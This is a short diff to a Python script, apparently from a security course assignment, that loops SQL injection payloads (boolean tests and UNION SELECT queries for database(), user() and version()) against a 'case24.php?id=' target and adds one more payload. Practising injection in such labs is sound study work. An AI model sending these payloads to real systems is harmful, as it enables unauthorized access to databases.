@@ -7,7 +7,8 @@ def handle_regex_result(regex_result):
 	return result
 base_url="http://www.wsb.com/Assignment2/case24.php?id="
 payload_list=["1","1' and '1'='1","1' and '1'='2",
-"1' and 1=2 union select database(),user() --+"]
+"1' and 1=2 union select database(),user() --+",
+"1' and 1=2 union select database(),version() --+"]
 for payload in payload_list:
 	r=requests.get(base_url+payload)
 	#print(r.text)
